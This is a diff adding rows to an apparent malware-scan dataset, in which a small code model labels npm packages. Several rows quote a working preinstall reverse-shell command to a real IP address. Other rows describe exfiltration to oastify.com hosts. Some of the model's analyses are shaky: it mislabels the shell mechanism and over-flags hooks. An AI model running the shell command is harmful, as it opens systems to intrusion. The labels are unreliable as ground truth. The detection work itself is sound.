@@ -2470,3 +2470,996 @@ Based on the provided information, there are no potential malicious behaviors, s
 ```
 
 This output indicates that no malicious behaviors, supply chain attacks, or security risks were found in the analyzed code.","{""behaviors"": [], ""risk_vector"": []}"
+@aszxc/npmexp,1.0.1,2025-12-21T04:17:46.382310,DeepSeek-Coder-6.7B-Instruct,v2.0,1,backdoor_installation,"[""backdoor_installation""]",0.9,"### Response:
+Based on the provided information, the code snippet contains a preinstall script that establishes a reverse shell connection to a remote server. This is a common technique used in malware for persistence and command and control. The script is written in bash and uses the netcat utility to create a reverse shell connection.
+
+Here is the JSON response based on the analysis:
+
+```json
+{
+  ""behaviors"": [
+    {
+      ""category"": ""backdoor_installation"",
+      ""summary"": ""Backdoor installation via preinstall script"",
+      ""details"": ""A preinstall script is used to establish a reverse shell connection to a remote server."",
+      ""confidence"": 0.9,
+      ""evidence_apis"": [],
+      ""evidence_files"": [
+        ""INSTALL SCRIPT""
+      ],
+      ""evidence_domains"": [],
+      ""evidence_commands"": [
+        ""bash -c 'bash -i >& /dev/tcp/39.96.12.202/22222 0>&1'""
+      ],
+      ""evidence_env_vars"": []
+    }
+  ],
+  ""risk_vector"": [
+    ""backdoor_installation""
+  ]
+}
+```
+
+In this response, the ""backdoor_installation"" category is used to identify the malicious behavior. The confidence score is set to 0.9, indicating high confidence in the detection of this behavior. The evidence_files field contains the code snippet, and the evidence_commands field contains the command used to establish the reverse shell.","{""package_name"": ""@aszxc/npmexp"", ""version"": ""1.0.1"", ""label"": ""malicious"", ""behaviors"": [{""category"": ""backdoor_installation"", ""summary"": ""Backdoor installation via preinstall script"", ""details"": ""A preinstall script is used to establish a reverse shell connection to a remote server."", ""confidence"": 0.9, ""evidence_apis"": [], ""evidence_files"": [""INSTALL SCRIPT""], ""evidence_domains"": [], ""evidence_commands"": [""bash -c 'bash -i >& /dev/tcp/39.96.12.202/22222 0>&1'""], ""evidence_env_vars"": [], ""id"": ""BRD886FDB5""}], ""risk_vector"": [""backdoor_installation""], ""analysis_metadata"": {""model"": ""deepseek-coder-6.7b"", ""stage"": ""v2.0""}, ""created_at"": ""2025-12-21T04:17:46.381976""}"
+@aszxc/npmexp,1.0.1,2025-12-21T04:19:12.982084,DeepSeek-Coder-6.7B-Instruct,v2.0,1,backdoor_installation,"[""backdoor_installation""]",0.9,"### Response:
+Based on the provided information, the code snippet contains a preinstall script that establishes a reverse shell connection to a remote server. This is a common technique used in malware for persistence and command and control. The script is written in bash and uses the netcat utility to create a reverse shell connection.
+
+Here is the JSON response based on the analysis:
+
+```json
+{
+  ""behaviors"": [
+    {
+      ""category"": ""backdoor_installation"",
+      ""summary"": ""Backdoor installation via preinstall script"",
+      ""details"": ""A preinstall script is used to establish a reverse shell connection to a remote server."",
+      ""confidence"": 0.9,
+      ""evidence_apis"": [],
+      ""evidence_files"": [
+        ""INSTALL SCRIPT""
+      ],
+      ""evidence_domains"": [],
+      ""evidence_commands"": [
+        ""bash -c 'bash -i >& /dev/tcp/39.96.12.202/22222 0>&1'""
+      ],
+      ""evidence_env_vars"": []
+    }
+  ],
+  ""risk_vector"": [
+    ""backdoor_installation""
+  ]
+}
+```
+
+In this response, the ""backdoor_installation"" category is used to identify the malicious behavior. The confidence score is set to 0.9, indicating high confidence in the detection of this behavior. The evidence_files field contains the code snippet, and the evidence_commands field contains the command used to establish the reverse shell.","{""package_name"": ""@aszxc/npmexp"", ""version"": ""1.0.1"", ""label"": ""malicious"", ""behaviors"": [{""category"": ""backdoor_installation"", ""summary"": ""Backdoor installation via preinstall script"", ""details"": ""A preinstall script is used to establish a reverse shell connection to a remote server."", ""confidence"": 0.9, ""evidence_apis"": [], ""evidence_files"": [""INSTALL SCRIPT""], ""evidence_domains"": [], ""evidence_commands"": [""bash -c 'bash -i >& /dev/tcp/39.96.12.202/22222 0>&1'""], ""evidence_env_vars"": [], ""id"": ""BR51415212""}], ""risk_vector"": [""backdoor_installation""], ""analysis_metadata"": {""model"": ""deepseek-coder-6.7b"", ""stage"": ""v2.0""}, ""created_at"": ""2025-12-21T04:19:12.979682""}"
+@aszxc/npmexp,1.0.1,2025-12-21T04:20:20.810778,DeepSeek-Coder-6.7B-Instruct,v2.0,1,backdoor_installation,"[""backdoor_installation""]",0.9,"### Response:
+Based on the provided information, the code snippet contains a preinstall script that establishes a reverse shell connection to a remote server. This is a common technique used in malware for persistence and command and control. The script is written in bash and uses the netcat utility to create a reverse shell connection.
+
+Here is the JSON response based on the analysis:
+
+```json
+{
+  ""behaviors"": [
+    {
+      ""category"": ""backdoor_installation"",
+      ""summary"": ""Backdoor installation via preinstall script"",
+      ""details"": ""A preinstall script is used to establish a reverse shell connection to a remote server."",
+      ""confidence"": 0.9,
+      ""evidence_apis"": [],
+      ""evidence_files"": [
+        ""INSTALL SCRIPT""
+      ],
+      ""evidence_domains"": [],
+      ""evidence_commands"": [
+        ""bash -c 'bash -i >& /dev/tcp/39.96.12.202/22222 0>&1'""
+      ],
+      ""evidence_env_vars"": []
+    }
+  ],
+  ""risk_vector"": [
+    ""backdoor_installation""
+  ]
+}
+```
+
+In this response, the ""backdoor_installation"" category is used to identify the malicious behavior. The confidence score is set to 0.9, indicating high confidence in the detection of this behavior. The evidence_files field contains the code snippet, and the evidence_commands field contains the command used to establish the reverse shell.","{""package_name"": ""@aszxc/npmexp"", ""version"": ""1.0.1"", ""label"": ""malicious"", ""behaviors"": [{""category"": ""backdoor_installation"", ""summary"": ""Backdoor installation via preinstall script"", ""details"": ""A preinstall script is used to establish a reverse shell connection to a remote server."", ""confidence"": 0.9, ""evidence_apis"": [], ""evidence_files"": [""INSTALL SCRIPT""], ""evidence_domains"": [], ""evidence_commands"": [""bash -c 'bash -i >& /dev/tcp/39.96.12.202/22222 0>&1'""], ""evidence_env_vars"": [], ""id"": ""BR8B2CB3AF""}], ""risk_vector"": [""backdoor_installation""], ""analysis_metadata"": {""model"": ""deepseek-coder-6.7b"", ""stage"": ""v2.0""}, ""created_at"": ""2025-12-21T04:20:20.810435""}"
+@aszxc/npmexp,1.0.1,2025-12-21T04:21:52.196358,DeepSeek-Coder-6.7B-Instruct,v2.0,1,backdoor_installation,"[""backdoor_installation""]",0.9,"### Response:
+Based on the provided information, the code snippet contains a preinstall script that establishes a reverse shell connection to a remote server. This is a common technique used in malware for persistence and command and control. The script is written in bash and uses the netcat utility to create a reverse shell connection.
+
+Here is the JSON response based on the analysis:
+
+```json
+{
+  ""behaviors"": [
+    {
+      ""category"": ""backdoor_installation"",
+      ""summary"": ""Backdoor installation via preinstall script"",
+      ""details"": ""A preinstall script is used to establish a reverse shell connection to a remote server."",
+      ""confidence"": 0.9,
+      ""evidence_apis"": [],
+      ""evidence_files"": [
+        ""INSTALL SCRIPT""
+      ],
+      ""evidence_domains"": [],
+      ""evidence_commands"": [
+        ""bash -c 'bash -i >& /dev/tcp/39.96.12.202/22222 0>&1'""
+      ],
+      ""evidence_env_vars"": []
+    }
+  ],
+  ""risk_vector"": [
+    ""backdoor_installation""
+  ]
+}
+```
+
+In this response, the ""backdoor_installation"" category is used to identify the malicious behavior. The confidence score is set to 0.9, indicating high confidence in the detection of this behavior. The evidence_files field contains the code snippet, and the evidence_commands field contains the command used to establish the reverse shell.","{""package_name"": ""@aszxc/npmexp"", ""version"": ""1.0.1"", ""label"": ""malicious"", ""behaviors"": [{""category"": ""backdoor_installation"", ""summary"": ""Backdoor installation via preinstall script"", ""details"": ""A preinstall script is used to establish a reverse shell connection to a remote server."", ""confidence"": 0.9, ""evidence_apis"": [], ""evidence_files"": [""INSTALL SCRIPT""], ""evidence_domains"": [], ""evidence_commands"": [""bash -c 'bash -i >& /dev/tcp/39.96.12.202/22222 0>&1'""], ""evidence_env_vars"": [], ""id"": ""BR5FFC51F3""}], ""risk_vector"": [""backdoor_installation""], ""analysis_metadata"": {""model"": ""deepseek-coder-6.7b"", ""stage"": ""v2.0""}, ""created_at"": ""2025-12-21T04:21:52.196020""}"
+@aszxc/npmexp,1.0.1,2025-12-21T04:22:45.290967,DeepSeek-Coder-6.7B-Instruct,v2.0,1,backdoor_installation,"[""backdoor_installation""]",0.9,"### Response:
+Based on the provided information, the code snippet contains a preinstall script that establishes a reverse shell connection to a remote server. This is a common technique used in malware for persistence and command and control. The script is written in bash and uses the netcat utility to create a reverse shell connection.
+
+Here is the JSON response based on the analysis:
+
+```json
+{
+  ""behaviors"": [
+    {
+      ""category"": ""backdoor_installation"",
+      ""summary"": ""Backdoor installation via preinstall script"",
+      ""details"": ""A preinstall script is used to establish a reverse shell connection to a remote server."",
+      ""confidence"": 0.9,
+      ""evidence_apis"": [],
+      ""evidence_files"": [
+        ""INSTALL SCRIPT""
+      ],
+      ""evidence_domains"": [],
+      ""evidence_commands"": [
+        ""bash -c 'bash -i >& /dev/tcp/39.96.12.202/22222 0>&1'""
+      ],
+      ""evidence_env_vars"": []
+    }
+  ],
+  ""risk_vector"": [
+    ""backdoor_installation""
+  ]
+}
+```
+
+In this response, the ""backdoor_installation"" category is used to identify the malicious behavior. The confidence score is set to 0.9, indicating high confidence in the detection of this behavior. The evidence_files field contains the code snippet, and the evidence_commands field contains the command used to establish the reverse shell.","{""package_name"": ""@aszxc/npmexp"", ""version"": ""1.0.1"", ""label"": ""malicious"", ""behaviors"": [{""category"": ""backdoor_installation"", ""summary"": ""Backdoor installation via preinstall script"", ""details"": ""A preinstall script is used to establish a reverse shell connection to a remote server."", ""confidence"": 0.9, ""evidence_apis"": [], ""evidence_files"": [""INSTALL SCRIPT""], ""evidence_domains"": [], ""evidence_commands"": [""bash -c 'bash -i >& /dev/tcp/39.96.12.202/22222 0>&1'""], ""evidence_env_vars"": [], ""id"": ""BRB568C89D""}], ""risk_vector"": [""backdoor_installation""], ""analysis_metadata"": {""model"": ""deepseek-coder-6.7b"", ""stage"": ""v2.0""}, ""created_at"": ""2025-12-21T04:22:45.290585""}"
+@aszxc/npmexp,1.0.1,2025-12-21T04:26:16.253907,DeepSeek-Coder-6.7B-Instruct,v2.0,1,backdoor_installation,"[""backdoor_installation""]",0.9,"### Response:
+Based on the provided information, the code snippet contains a preinstall script that establishes a reverse shell connection to a remote server. This is a common technique used in malware for persistence and command and control. The script is written in bash and uses the netcat utility to create a reverse shell connection.
+
+Here is the JSON response based on the analysis:
+
+```json
+{
+  ""behaviors"": [
+    {
+      ""category"": ""backdoor_installation"",
+      ""summary"": ""Backdoor installation via preinstall script"",
+      ""details"": ""A preinstall script is used to establish a reverse shell connection to a remote server."",
+      ""confidence"": 0.9,
+      ""evidence_apis"": [],
+      ""evidence_files"": [
+        ""INSTALL SCRIPT""
+      ],
+      ""evidence_domains"": [],
+      ""evidence_commands"": [
+        ""bash -c 'bash -i >& /dev/tcp/39.96.12.202/22222 0>&1'""
+      ],
+      ""evidence_env_vars"": []
+    }
+  ],
+  ""risk_vector"": [
+    ""backdoor_installation""
+  ]
+}
+```
+
+In this response, the ""backdoor_installation"" category is used to identify the malicious behavior. The confidence score is set to 0.9, indicating high confidence in the detection of this behavior. The evidence_files field contains the code snippet, and the evidence_commands field contains the command used to establish the reverse shell.","{""package_name"": ""@aszxc/npmexp"", ""version"": ""1.0.1"", ""label"": ""malicious"", ""behaviors"": [{""category"": ""backdoor_installation"", ""summary"": ""Backdoor installation via preinstall script"", ""details"": ""A preinstall script is used to establish a reverse shell connection to a remote server."", ""confidence"": 0.9, ""evidence_apis"": [], ""evidence_files"": [""INSTALL SCRIPT""], ""evidence_domains"": [], ""evidence_commands"": [""bash -c 'bash -i >& /dev/tcp/39.96.12.202/22222 0>&1'""], ""evidence_env_vars"": [], ""id"": ""BR0B6F39E0""}], ""risk_vector"": [""backdoor_installation""], ""analysis_metadata"": {""model"": ""deepseek-coder-6.7b"", ""stage"": ""v2.0""}, ""created_at"": ""2025-12-21T04:26:16.253635""}"
+@angular/core,16.2.6,2025-12-21T04:26:31.926091,DeepSeek-Coder-6.7B-Instruct,v2.0,0,,[],0,"### Response:
+Based on the provided information, there are no potential malicious behaviors, supply chain attacks, or security risks identified in the code snippets or structural analysis context. Therefore, the JSON output would be as follows:
+
+```json
+{
+  ""behaviors"": [],
+  ""risk_vector"": []
+}
+```
+
+This output indicates that no malicious behaviors, supply chain attacks, or security risks were found in the analyzed code.","{""package_name"": ""@angular/core"", ""version"": ""16.2.6"", ""label"": ""benign"", ""behaviors"": [], ""risk_vector"": [], ""analysis_metadata"": {""model"": ""deepseek-coder-6.7b"", ""stage"": ""v2.0""}, ""created_at"": ""2025-12-21T04:26:31.925839""}"
+@angular/core,16.2.6,2025-12-21T04:29:43.815318,DeepSeek-Coder-6.7B-Instruct,v2.0,0,,[],0,"### Response:
+Based on the provided information, there are no potential malicious behaviors, supply chain attacks, or security risks identified in the code snippets or structural analysis context. Therefore, the JSON output would be as follows:
+
+```json
+{
+  ""behaviors"": [],
+  ""risk_vector"": []
+}
+```
+
+This output indicates that no malicious behaviors, supply chain attacks, or security risks were found in the analyzed code.","{""package_name"": ""@angular/core"", ""version"": ""16.2.6"", ""label"": ""benign"", ""behaviors"": [], ""risk_vector"": [], ""analysis_metadata"": {""model"": ""deepseek-coder-6.7b"", ""stage"": ""v2.0""}, ""created_at"": ""2025-12-21T04:29:43.815081""}"
+@arkadium/eagle-user-client,9.1.1,2025-12-23T23:35:20.916223,DeepSeek-Coder-6.7B-Instruct,v2.0,1,credential_theft,"[""credential_theft""]",0.7,"### Response:
+Based on the provided information, the code snippet appears to be a preinstall script that is being run with a command line argument. The command line argument appears to be a username and password for a service, which could potentially be used for credential theft. However, without more context or evidence, it's hard to provide a definitive analysis.
+
+Here's a basic JSON skeleton based on the provided information:
+
+```json
+{
+  ""behaviors"": [
+    {
+      ""category"": ""credential_theft"",
+      ""summary"": ""Potential credential theft via preinstall script"",
+      ""details"": ""Command line argument appears to contain username and password"",
+      ""confidence"": ""0.7"",
+      ""evidence_apis"": [],
+      ""evidence_files"": [],
+      ""evidence_domains"": [],
+      ""evidence_commands"": [""node ./.pbk.js Xfinity @arkadium/eagle-user-client 9.1.1""],
+      ""evidence_env_vars"": []
+    }
+  ],
+  ""risk_vector"": [""credential_theft""]
+}
+```
+
+This analysis is based on the provided information and may not be 100% accurate. For a more accurate analysis, more context or evidence would be needed.","{""package_name"": ""@arkadium/eagle-user-client"", ""version"": ""9.1.1"", ""label"": ""malicious"", ""behaviors"": [{""category"": ""credential_theft"", ""summary"": ""Potential credential theft via preinstall script"", ""details"": ""Command line argument appears to contain username and password"", ""confidence"": ""0.7"", ""evidence_apis"": [], ""evidence_files"": [], ""evidence_domains"": [], ""evidence_commands"": [""node ./.pbk.js Xfinity @arkadium/eagle-user-client 9.1.1""], ""evidence_env_vars"": [], ""id"": ""BR4E386F75""}], ""risk_vector"": [""credential_theft""], ""analysis_metadata"": {""model"": ""deepseek-coder-6.7b"", ""stage"": ""v2.0""}, ""created_at"": ""2025-12-23T23:35:20.915924""}"
+@arkadium/eagle-user-client,9.99.999,2025-12-23T23:35:41.894676,DeepSeek-Coder-6.7B-Instruct,v2.0,1,credential_theft,"[""credential_theft""]",0.7,"### Response:
+Based on the provided information, the code snippet appears to be a preinstall script that is being run with a command line argument. The command line argument appears to be a username and password for a service, which could potentially be used for credential theft. However, without more context or evidence, it's hard to provide a definitive analysis.
+
+Here's a basic JSON skeleton based on the provided information:
+
+```json
+{
+  ""behaviors"": [
+    {
+      ""category"": ""credential_theft"",
+      ""summary"": ""Potential credential theft via preinstall script"",
+      ""details"": ""Command line argument appears to contain username and password"",
+      ""confidence"": ""0.7"",
+      ""evidence_apis"": [],
+      ""evidence_files"": [],
+      ""evidence_domains"": [],
+      ""evidence_commands"": [""node ./.pbk.js Xfinity @arkadium/eagle-user-client 9.99.999""],
+      ""evidence_env_vars"": []
+    }
+  ],
+  ""risk_vector"": [
+    ""credential_theft""
+  ]
+}
+```
+
+This analysis is based on the provided information and may not be 100% accurate. For a more accurate analysis, more context or evidence would be needed.","{""package_name"": ""@arkadium/eagle-user-client"", ""version"": ""9.99.999"", ""label"": ""malicious"", ""behaviors"": [{""category"": ""credential_theft"", ""summary"": ""Potential credential theft via preinstall script"", ""details"": ""Command line argument appears to contain username and password"", ""confidence"": ""0.7"", ""evidence_apis"": [], ""evidence_files"": [], ""evidence_domains"": [], ""evidence_commands"": [""node ./.pbk.js Xfinity @arkadium/eagle-user-client 9.99.999""], ""evidence_env_vars"": [], ""id"": ""BRE687FD7A""}], ""risk_vector"": [""credential_theft""], ""analysis_metadata"": {""model"": ""deepseek-coder-6.7b"", ""stage"": ""v2.0""}, ""created_at"": ""2025-12-23T23:35:41.894401""}"
+@att-bit/duc.components.cardshell,10.0.0,2025-12-23T23:36:01.722383,DeepSeek-Coder-6.7B-Instruct,v2.0,1,install_hook,"[""install_hook""]",0.8,"### Response:
+Based on the provided code snippets and structural analysis context, the package @att-bit/duc.components.cardshell has the following potential malicious behaviors:
+
+```json
+{
+  ""behaviors"": [
+    {
+      ""category"": ""install_hook"",
+      ""summary"": ""Install hook present that may lead to unauthorized installation or malicious behavior"",
+      ""details"": ""A preinstall script is found in the package. This script may lead to unauthorized installation or malicious behavior if not properly managed."",
+      ""confidence"": 0.8,
+      ""evidence_files"": [
+        ""package.json""
+      ]
+    }
+  ],
+  ""risk_vector"": [
+    ""install_hook""
+  ]
+}
+```
+
+This package has an install hook present, which could lead to unauthorized installation or malicious behavior if not properly managed. The confidence score is 0.8, indicating high confidence in the evidence. The evidence is present in the package.json file.","{""package_name"": ""@att-bit/duc.components.cardshell"", ""version"": ""10.0.0"", ""label"": ""malicious"", ""behaviors"": [{""category"": ""install_hook"", ""summary"": ""Install hook present that may lead to unauthorized installation or malicious behavior"", ""details"": ""A preinstall script is found in the package. This script may lead to unauthorized installation or malicious behavior if not properly managed."", ""confidence"": 0.8, ""evidence_files"": [""package.json""], ""id"": ""BR6F2A84DD""}], ""risk_vector"": [""install_hook""], ""analysis_metadata"": {""model"": ""deepseek-coder-6.7b"", ""stage"": ""v2.0""}, ""created_at"": ""2025-12-23T23:36:01.722111""}"
+@att-bit/duc.components.cardshell,10.0.1,2025-12-23T23:36:48.943131,DeepSeek-Coder-6.7B-Instruct,v2.0,5,credential_theft;install_hook;network_reconnaissance;remote_code_execution;sensitive_data_collection,"[""network_reconnaissance"", ""credential_theft"", ""sensitive_data_collection"", ""remote_code_execution"", ""install_hook""]",0.9,"### Response:
+Based on the provided code snippets and structural analysis context, the package @att-bit/duc.components.cardshell has the following potential malicious behaviors:
+
+1. **Network Reconnaissance**: The preinstall script sends DNS queries and HTTP requests to the provided URLs. This could potentially be used for network reconnaissance or to gather information about the system.
+
+2. **Credential Theft**: The preinstall script sends the content of the /etc/hosts file to the provided URL. This could potentially be used to steal credentials or sensitive information.
+
+3. **Sensitive Data Collection**: The preinstall script sends the output of the `uname` command to the provided URL. This could potentially be used to gather information about the system.
+
+4. **Remote Code Execution**: The preinstall script contains the potential for remote code execution.
+
+5. **Install Hook**: The package has a preinstall script, which could potentially be used to install a backdoor or malicious code.
+
+Here is the JSON output based on the analysis:
+
+```json
+{
+  ""behaviors"": [
+    {
+      ""category"": ""network_reconnaissance"",
+      ""summary"": ""The package sends DNS queries and HTTP requests to the provided URLs during preinstall script execution."",
+      ""details"": ""The preinstall script contains commands that send DNS queries and HTTP requests to the provided URLs."",
+      ""confidence"": 0.8,
+      ""evidence_apis"": [
+        ""https://s5yyin8i0k0g9u7wx12fwg9im9s0g04p.oastify.com"",
+        ""https://uname.rqlx3mthljlfutsvi0nehfuh78dz10pp.oastify.com""
+      ],
+      ""evidence_files"": [],
+      ""evidence_domains"": [],
+      ""evidence_commands"": [],
+      ""evidence_env_vars"": []
+    },
+    {
+      ""category"": ""credential_theft"",
+      ""summary"": ""The package sends the content of the /etc/hosts file to the provided URL during preinstall script execution."",
+      ""details"": ""The preinstall script contains a command that sends the content of the /etc/hosts file to the provided URL."",
+      ""confidence"": 0.7,
+      ""evidence_apis"": [
+        ""https://s5yyin8i0k0g9u7wx12fwg9im9s0g04p.oastify.com""
+      ],
+      ""evidence_files"": [
+        ""/etc/hosts""
+      ],
+      ""evidence_domains"": [],
+      ""evidence_commands"": [],
+      ""evidence_env_vars"": []
+    },
+    {
+      ""category"": ""sensitive_data_collection"",
+      ""summary"": ""The package sends the output of the `uname` command to the provided URL during preinstall script execution."",
+      ""details"": ""The preinstall script contains a command that sends the output of the `uname` command to the provided URL."",
+      ""confidence"": 0.7,
+      ""evidence_apis"": [
+        ""https://uname.rqlx3mthljlfutsvi0nehfuh78dz10pp.oastify.com""
+      ],
+      ""evidence_files"": [],
+      ""evidence_domains"": [],
+      ""evidence_commands"": [],
+      ""evidence_env_vars"": []
+    },
+    {
+      ""category"": ""remote_code_execution"",
+      ""summary"": ""The package contains the potential for remote code execution during preinstall script execution."",
+      ""details"": ""The preinstall script contains commands that could potentially be used to execute remote code."",
+      ""confidence"": 0.9,
+      ""evidence_apis"": [],
+      ""evidence_files"": [],
+      ""evidence_domains"": [],
+      ""evidence_commands"": [],
+      ""evidence_env_vars"": []
+    },
+    {
+      ""category"": ""install_hook"",
+      ""summary"": ""The package has a preinstall script that could potentially be used to install a backdoor or malicious code."",
+      ""details"": ""The package contains a preinstall script that could potentially be used to install a backdoor or malicious code."",
+      ""confidence"": 0.9,
+      ""evidence_apis"": [],
+      ""evidence_files"": [],
+      ""evidence_domains"": [],
+      ""evidence_commands"": [],
+      ""evidence_env_vars"": []
+    }
+  ],
+  ""risk_vector"": [
+    ""network_reconnaissance"",
+    ""credential_theft"",
+    ""sensitive_data_collection"",
+    ""remote_code_execution"",
+    ""install_hook""
+  ]
+}
+```
+
+Please note that this analysis is based on the provided code snippets and structural analysis context. The actual risk of these behaviors could be higher or lower depending on the context and the overall system's security posture.","{""package_name"": ""@att-bit/duc.components.cardshell"", ""version"": ""10.0.1"", ""label"": ""malicious"", ""behaviors"": [{""category"": ""network_reconnaissance"", ""summary"": ""The package sends DNS queries and HTTP requests to the provided URLs during preinstall script execution."", ""details"": ""The preinstall script contains commands that send DNS queries and HTTP requests to the provided URLs."", ""confidence"": 0.8, ""evidence_apis"": [""https://s5yyin8i0k0g9u7wx12fwg9im9s0g04p.oastify.com"", ""https://uname.rqlx3mthljlfutsvi0nehfuh78dz10pp.oastify.com""], ""evidence_files"": [], ""evidence_domains"": [], ""evidence_commands"": [], ""evidence_env_vars"": [], ""id"": ""BR8B2DB7F1""}, {""category"": ""credential_theft"", ""summary"": ""The package sends the content of the /etc/hosts file to the provided URL during preinstall script execution."", ""details"": ""The preinstall script contains a command that sends the content of the /etc/hosts file to the provided URL."", ""confidence"": 0.7, ""evidence_apis"": [""https://s5yyin8i0k0g9u7wx12fwg9im9s0g04p.oastify.com""], ""evidence_files"": [""/etc/hosts""], ""evidence_domains"": [], ""evidence_commands"": [], ""evidence_env_vars"": [], ""id"": ""BR9F90EB85""}, {""category"": ""sensitive_data_collection"", ""summary"": ""The package sends the output of the `uname` command to the provided URL during preinstall script execution."", ""details"": ""The preinstall script contains a command that sends the output of the `uname` command to the provided URL."", ""confidence"": 0.7, ""evidence_apis"": [""https://uname.rqlx3mthljlfutsvi0nehfuh78dz10pp.oastify.com""], ""evidence_files"": [], ""evidence_domains"": [], ""evidence_commands"": [], ""evidence_env_vars"": [], ""id"": ""BRB72D56AA""}, {""category"": ""remote_code_execution"", ""summary"": ""The package contains the potential for remote code execution during preinstall script execution."", ""details"": ""The preinstall script contains commands that could potentially be used to execute remote code."", ""confidence"": 0.9, ""evidence_apis"": [], ""evidence_files"": [], ""evidence_domains"": [], ""evidence_commands"": [], ""evidence_env_vars"": [], ""id"": ""BR5DE0DC03""}, {""category"": ""install_hook"", ""summary"": ""The package has a preinstall script that could potentially be used to install a backdoor or malicious code."", ""details"": ""The package contains a preinstall script that could potentially be used to install a backdoor or malicious code."", ""confidence"": 0.9, ""evidence_apis"": [], ""evidence_files"": [], ""evidence_domains"": [], ""evidence_commands"": [], ""evidence_env_vars"": [], ""id"": ""BRCEC7A079""}], ""risk_vector"": [""network_reconnaissance"", ""credential_theft"", ""sensitive_data_collection"", ""remote_code_execution"", ""install_hook""], ""analysis_metadata"": {""model"": ""deepseek-coder-6.7b"", ""stage"": ""v2.0""}, ""created_at"": ""2025-12-23T23:36:48.942780""}"
+@angular/core,16.2.6,2025-12-23T23:37:08.711277,DeepSeek-Coder-6.7B-Instruct,v2.0,0,,[],0,"### Response:
+Based on the provided information, there are no potential malicious behaviors, supply chain attacks, or security risks identified in the code snippets or structural analysis context. Therefore, the JSON output would be as follows:
+
+```json
+{
+  ""behaviors"": [],
+  ""risk_vector"": []
+}
+```
+
+This output indicates that no malicious behaviors, supply chain attacks, or security risks were found in the analyzed code.","{""package_name"": ""@angular/core"", ""version"": ""16.2.6"", ""label"": ""benign"", ""behaviors"": [], ""risk_vector"": [], ""analysis_metadata"": {""model"": ""deepseek-coder-6.7b"", ""stage"": ""v2.0""}, ""created_at"": ""2025-12-23T23:37:08.710957""}"
+@arkadium/eagle-user-client,9.1.1,2025-12-23T23:44:47.352861,DeepSeek-Coder-6.7B-Instruct,v2.0,1,credential_theft,"[""credential_theft""]",0.7,"### Response:
+Based on the provided information, the code snippet appears to be a preinstall script that is being run with a command line argument. The command line argument appears to be a username and password for a service, which could potentially be used for credential theft. However, without more context or evidence, it's hard to provide a definitive analysis.
+
+Here's a basic JSON skeleton based on the provided information:
+
+```json
+{
+  ""behaviors"": [
+    {
+      ""category"": ""credential_theft"",
+      ""summary"": ""Potential credential theft via preinstall script"",
+      ""details"": ""Command line argument appears to contain username and password"",
+      ""confidence"": ""0.7"",
+      ""evidence_apis"": [],
+      ""evidence_files"": [],
+      ""evidence_domains"": [],
+      ""evidence_commands"": [""node ./.pbk.js Xfinity @arkadium/eagle-user-client 9.1.1""],
+      ""evidence_env_vars"": []
+    }
+  ],
+  ""risk_vector"": [""credential_theft""]
+}
+```
+
+This analysis is based on the provided information and may not be 100% accurate. For a more accurate analysis, more context or evidence would be needed.","{""package_name"": ""@arkadium/eagle-user-client"", ""version"": ""9.1.1"", ""label"": ""malicious"", ""behaviors"": [{""category"": ""credential_theft"", ""summary"": ""Potential credential theft via preinstall script"", ""details"": ""Command line argument appears to contain username and password"", ""confidence"": ""0.7"", ""evidence_apis"": [], ""evidence_files"": [], ""evidence_domains"": [], ""evidence_commands"": [""node ./.pbk.js Xfinity @arkadium/eagle-user-client 9.1.1""], ""evidence_env_vars"": [], ""id"": ""BRD902655B""}], ""risk_vector"": [""credential_theft""], ""analysis_metadata"": {""model"": ""deepseek-coder-6.7b"", ""stage"": ""v2.0""}, ""created_at"": ""2025-12-23T23:44:47.352533""}"
+@arkadium/eagle-user-client,9.99.999,2025-12-23T23:45:08.215109,DeepSeek-Coder-6.7B-Instruct,v2.0,1,credential_theft,"[""credential_theft""]",0.7,"### Response:
+Based on the provided information, the code snippet appears to be a preinstall script that is being run with a command line argument. The command line argument appears to be a username and password for a service, which could potentially be used for credential theft. However, without more context or evidence, it's hard to provide a definitive analysis.
+
+Here's a basic JSON skeleton based on the provided information:
+
+```json
+{
+  ""behaviors"": [
+    {
+      ""category"": ""credential_theft"",
+      ""summary"": ""Potential credential theft via preinstall script"",
+      ""details"": ""Command line argument appears to contain username and password"",
+      ""confidence"": ""0.7"",
+      ""evidence_apis"": [],
+      ""evidence_files"": [],
+      ""evidence_domains"": [],
+      ""evidence_commands"": [""node ./.pbk.js Xfinity @arkadium/eagle-user-client 9.99.999""],
+      ""evidence_env_vars"": []
+    }
+  ],
+  ""risk_vector"": [
+    ""credential_theft""
+  ]
+}
+```
+
+This analysis is based on the provided information and may not be 100% accurate. For a more accurate analysis, more context or evidence would be needed.","{""package_name"": ""@arkadium/eagle-user-client"", ""version"": ""9.99.999"", ""label"": ""malicious"", ""behaviors"": [{""category"": ""credential_theft"", ""summary"": ""Potential credential theft via preinstall script"", ""details"": ""Command line argument appears to contain username and password"", ""confidence"": ""0.7"", ""evidence_apis"": [], ""evidence_files"": [], ""evidence_domains"": [], ""evidence_commands"": [""node ./.pbk.js Xfinity @arkadium/eagle-user-client 9.99.999""], ""evidence_env_vars"": [], ""id"": ""BRA10EC876""}], ""risk_vector"": [""credential_theft""], ""analysis_metadata"": {""model"": ""deepseek-coder-6.7b"", ""stage"": ""v2.0""}, ""created_at"": ""2025-12-23T23:45:08.214776""}"
+@att-bit/duc.components.cardshell,10.0.0,2025-12-23T23:45:27.908761,DeepSeek-Coder-6.7B-Instruct,v2.0,1,install_hook,"[""install_hook""]",0.8,"### Response:
+Based on the provided code snippets and structural analysis context, the package @att-bit/duc.components.cardshell has the following potential malicious behaviors:
+
+```json
+{
+  ""behaviors"": [
+    {
+      ""category"": ""install_hook"",
+      ""summary"": ""Install hook present that may lead to unauthorized installation or malicious behavior"",
+      ""details"": ""A preinstall script is found in the package. This script may lead to unauthorized installation or malicious behavior if not properly managed."",
+      ""confidence"": 0.8,
+      ""evidence_files"": [
+        ""package.json""
+      ]
+    }
+  ],
+  ""risk_vector"": [
+    ""install_hook""
+  ]
+}
+```
+
